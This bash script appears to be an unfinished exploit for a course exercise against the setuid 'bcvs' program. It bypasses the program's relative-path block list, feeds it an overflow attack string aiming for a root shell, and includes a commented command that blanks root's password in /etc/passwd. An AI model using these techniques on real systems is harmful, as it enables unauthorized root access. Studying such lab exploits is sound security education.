#!/bin/bash

## -------------------- Description -------------------- ##
# The bcvs program uses a relative path to check its
# "block.list". Therefore you can simply execute bcvs
# from a directory other than its usual but with the
# same directory layout and you can get around the blocks
#
# Right now this sploit is not complete but being able to
# bypass the block check is a start.
#
# Right now I am working on exploiting the strcpy/strcat
# overflow in the copyFile function.
## ----------------------------------------------------- ##

SPLOIT_DIR="sploit7_dir"
# Setup necessary environment
rm -rf $SPLOIT_DIR
mkdir -p $SPLOIT_DIR
cd $SPLOIT_DIR
mkdir -p .bcvs
touch .bcvs/block.list

## Saving some stuff for later
# Following will give the root user no password
# cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'

OFFSET=361
ATTACK_STR="noobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoobnoob000440"
echo "ATTACK_STR (length: ${#ATTACK_STR}): $ATTACK_STR"

cat <<EOS > "run_w_gdb.sh"
#gdb --args /opt/bcvs/bcvs co "\$SC"
gdb --args /opt/bcvs/bcvs co "$ATTACK_STR"
EOS
chmod +x run_w_gdb.sh

cat <<EOS > "update_sploit.sh"
cd ..
./sploit7.sh -s
cd $SPLOIT_DIR
EOS

if [[ $# -gt 0 && $1 == "-s" ]]; then
  echo "Skipping exploit run. Scripts updated."
  exit 0
fi

echo "comment" | /opt/bcvs/bcvs co "$ATTACK_STR"

# And then hopefully you have a root shell at this point
